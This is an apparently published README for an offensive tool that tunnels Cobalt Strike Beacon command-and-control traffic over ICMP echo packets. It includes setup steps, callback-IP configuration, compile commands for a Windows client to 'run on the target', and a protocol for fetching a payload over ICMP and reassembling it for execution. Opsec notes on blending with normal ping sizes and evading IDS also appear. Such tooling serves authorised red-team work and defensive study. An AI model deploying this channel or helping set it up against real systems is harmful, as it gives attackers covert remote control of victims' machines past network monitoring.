# ICMP C2 Protocol Overview

An ICMP channel for Beacons, implemented using Cobalt Strike’s External C2 framework.

## Blog Post:
<a href="https://ryanq47.github.io/posts/CobaltStrike_ICMP_Tunnel/" target="_blank" rel="noopener noreferrer">CobaltStrike ICMP Tunnel</a>

## Related Projects:
[CS-EXTC2-ICMP](https://github.com/ryanq47/CS-EXTC2-NTP)

## Demo video:
(I apologize for the quality, GH limits to 10mb. A full quality video is on the blog) :

https://github.com/user-attachments/assets/cf318981-7adf-4e79-9b58-79e38318d5c4


## Key Concepts

- **ICMP Echo Request (Type 8)**: Used by the client (“agent”) to signal the server (“controller”) and request data.
- **ICMP Echo Reply (Type 0)**: Used by the controller to embed and send replies (including large payloads) back to the client.
- **TAG (4 bytes)**: A fixed 4‐byte marker (e.g. `RQ47`) prepended to every ICMP payload, so that unrelated OS pings or network noise are ignored.
- **ICMP_PAYLOAD_SIZE (default 1000 bytes)**: Defines how many bytes we can carry in each ICMP packet’s data‐field. In both `controller.py` and `client_x86.c`, this is set to 1000 by default.  
    > Opsec: Windows default payload size is 32 bytes, where UNIX is 52. 
- **Chunking**: When the controller needs to send more data than fits in a single ICMP payload (1000 bytes), it splits the payload into fragments of up to **996** bytes each (ICMP_PAYLOAD_SIZE – TAG_SIZE = 1000 – 4). Each fragment still carries the same 4‐byte tag.

---

# Setup:

1. **Install dependencies:**

   ```bash
   sudo apt install libpcap0.8-dev
   ```

   ```bash
   pip install -r Controller/Python/requirements.txt
   ```

2. **Start an External C2 beacon in Cobalt Strike (TeamServer).**

3. **Edit the following fields in these files to fit your enviornment:**

   - **`Controller/Python/controller.py`:**
     ```python
     TEAMSERVER_IP   = "10.10.10.21"  # Change to your TeamServer’s IP (e.g. 127.0.0.1 if running locally)
     TEAMSERVER_PORT = 2222          # Change to TeamServer’s listening port
     # (These must stay in sync with how your Beacon is configured.)
     ICMP_TAG = "RQ47"              # The ICMP tag, MUST match client

     BEACON_PIPENAME = "foobar"     # Name of pipe to communicate over between the Beacon & Client
     BEACON_ARCH = "x86"            # what architecture is the client - used for payload generation
     ```
   - **`client_x86.c`:**
     ```c
     #define ICMP_CALLBACK_SERVER "172.19.241.197"  // Change to your Controller’s IP
     #define ICMP_PAYLOAD_SIZE      1000           // Must match controller.py‘s ICMP_PAYLOAD_SIZE
     #define ICMP_TAG               "RQ47"         // 4‐byte tag (can be changed, but must match controller)
     #define PIPENAME               "\\\\.\\pipe\\foobar"  // Named pipe as configured by the Controller’s pipename
     ```

   There are other tunable constants in both files (e.g. `SLEEP_TIME` in the client, `PIPENAME`, etc.). Review each file’s top‐section comments for details.

4. **Compile the client (Windows build target):**

   ```bash
   i686-w64-mingw32-gcc client_x86.c -o client_x86.exe -lws2_32
   ```
   > You may also try a 64-bit MinGW compile (`x86_64-w64-mingw32-gcc ...`) but only the 32-bit build has been fully tested.

5. **disable host ICMP repsonses**

    This prevents incorrect ICMP responses from getting sent back from the host, instead of the ICMP listener.

   > Note, this effectively disables any normal pings to the server, it looks to be possible to have the Controller respond back to normal/non-implant pings, however I haven't implemented that yet. 

   > If the `client` is crashing, see how many packets are receieved. If 1: the below command has not run, and ICMP responses are still enabled on the system. 

   ```bash
   sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
   ```

7. **Run the controller:**

   ```bash
   python3 Controller/Python/controller.py
   ```

   > Note, if you don't want to run this as root, you will need to give python the permissions to do raw ICMP packets. The following command should enabel this, and yes, it works in VENV's as well:

   `sudo setcap net raw+ep $(realpath $(which python3))`

    - cap_net_raw+ep is the POSIX capability that lets the ELF binary open raw sockets.

    - Pointing at `$(realpath $(which python3))` ensures you’re capping the actual interpreter ELF, not a symlink (This fixed the VENV symlink issue)

    - Any script run under that interpreter—whether in a venv or system—now inherits the raw‐socket permission, so you no longer need to prefix with sudo.

9. **Run the compiled client on the target:**

   ```bash
   client_x86.exe
   ```

---

## Overall Flow

1. **Client: “Seq 0” Size Request**  
   - The client opens a raw ICMP socket.  
   - It builds an ICMP Echo Request (Type 8) whose payload is:
     ```
     [TAG (4 bytes)] [4-byte big-endian integer: total_bytes_expected]
     ```
     and sends it with **sequence number 0**.  
   - Purpose: inform the controller how many bytes of data it plans to receive.

2. **Controller: Immediate “Seq 0” Reply (Size Confirmation)**  
   - The controller’s sniffer sees an ICMP packet where:
     - Type == 8 (Echo Request)  
     - Payload starts with `TAG`  
     - Sequence == 0  
   - It extracts the 4-byte length, allocates a receive buffer of that size, and immediately responds with an ICMP Echo Reply (Type 0), also with **sequence 0**. Its payload is:
     ```
     [TAG (4 bytes)] [4-byte big-endian integer: total_bytes_to_send]
     ```
   - This confirms to the client that the server is ready to send exactly that many bytes.

3. **Controller: Sending Data Fragments (Seq 1…N)**  
   - If the data to send exceeds **1000 bytes**, the controller splits it into fragments of up to **996** bytes each (ICMP_PAYLOAD_SIZE – TAG_SIZE).  
   - For each fragment **i** (starting at 1), the controller sends an ICMP Echo Reply (Type 0) with:
     ```text
     Sequence = i
     Payload  = [TAG][next 996 bytes of data]
     ```
   - If the full payload fits within one chunk (≤ 996 bytes of data), only **seq 1** is used. Otherwise, multiple replies arrive in sequence.

4. **Client: Reassembly Loop**  
   - After sending “seq 0” and waiting, the client’s raw socket filters incoming packets, accepting only:
     - ICMP packets of Type 0 (Echo Reply)  
     - Matching its own process ID  
     - Payload beginning with `TAG`  
   - When **seq 0** arrives, the client reads the 4-byte length, allocates a buffer, and computes how many fragments it expects:
     ```
     data_per_chunk = ICMP_PAYLOAD_SIZE – TAG_SIZE  # = 1000 – 4 = 996
     total_chunks   = ceil(total_size / 996)
     ```
   - For each subsequent reply **seq = 1…total_chunks**, the client copies the data portion (i.e., the bytes after the 4-byte TAG) into the correct offset in the buffer. Once all fragments are received, the full payload is ready for execution or further processing.

5. **Beaconing & TeamServer Forwarding (Seq > 0)**  
   - After the initial C2 payload, the client may send extra frames (e.g., Beacon or task data). Each of these is sent as an ICMP Echo Request (Type 8) with:
     ```
     Sequence = X (> 0)
     Payload  = [TAG][user_data…]
     ```
   - The controller, upon spotting **seq > 0**, strips `TAG` and forwards the remaining bytes to the TeamServer over a TCP socket.  
   - Any response from the TeamServer is sent back in a single ICMP Echo Reply (Type 0) with:
     ```
     Sequence = X
     Payload  = [TAG][TeamServer_response]
     ```
   - This ensures a 1:1 mapping of in‐flight Beacon frames to replies, using the same sequence number to correlate.

---

## Packet Structure Summary

> **Constants** (both sides):
> ```text
> ICMP_PAYLOAD_SIZE = 1000      # bytes available for data+TAG
> TAG_SIZE          = 4         # bytes (e.g. “RQ47”)
> MAX_DATA_PER_CHUNK = 1000 – 4 = 996  # actual data per chunk
> ```
>
> **Note**: The 4-byte TAG is always the first 4 bytes of every payload, so each chunk’s data is at most 996 bytes.

- **Client → Controller (Seq 0)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=8, Code=0, ID=<PID>, Seq=0)
        └─ Payload   : 1000 bytes total
              [ “RQ47” ][ 4-byte total_size ][ padding… (up to 992 bytes) ]
  ```

- **Controller → Client (Seq 0 Reply)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=0)
        └─ Payload   : 1000 bytes total
              [ “RQ47” ][ 4-byte total_size ][ padding… (up to 992 bytes) ]
  ```

- **Controller → Client (Seq i Reply)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=i)
        └─ Payload   : ≤ 1000 bytes
              [ “RQ47” ][ up to 996 bytes of data ]
  ```

- **Client → Controller (Seq i Request, after C2 payload)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=8, Code=0, ID=<PID>, Seq=i)
        └─ Payload   : ≤ 1000 bytes
              [ “RQ47” ][ up to 996 bytes of Beacon/command data ]
  ```

- **Controller → Client (Seq i Reply, TeamServer data)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=i)
        └─ Payload   : ≤ 1000 bytes
              [ “RQ47” ][ TeamServer response data ]
  ```

---

<!-- ## Advantages & Caveats

- **Quietness**: Leverages legitimate ICMP traffic.
- **Minimal Dependencies**: Only raw sockets (client) and basic Scapy (controller) are needed.
- **Fragility**: No built-in session encryption or integrity checks—relying solely on the 4-byte TAG for filtering.
- **IDS/Firewall Risk**: Large or unusual ICMP payloads may trigger alerts. We chunk at 996 bytes to avoid IP‐level fragmentation, but the TAG may still look suspicious.

---

## Usage Notes

1. **Client setup**: Must run as an administrator (Windows) to open a raw ICMP socket, or as root (Linux) if you port the code there.
2. **Controller setup**: Needs elevated privileges to sniff/send raw ICMP (via Scapy).
3. **Tag matching**: Both sides ignore any ICMP not starting with `RQ47`. This prevents OS‐generated pings from disrupting the reassembly logic.
4. **Timeouts**: The client’s `recv_icmp_fragments()` has no explicit timeout per‐packet, so if fragments never arrive, it will block indefinitely. You may want to add a `setsockopt(..., SO_RCVTIMEO, ...)` or similar.
5. **TeamServer traffic**: After the initial C2 payload is delivered, any “seq > 0” ICMP Echo Requests are forwarded to the TeamServer over a plain TCP connection; replies come back in Echo Replies.
 -->
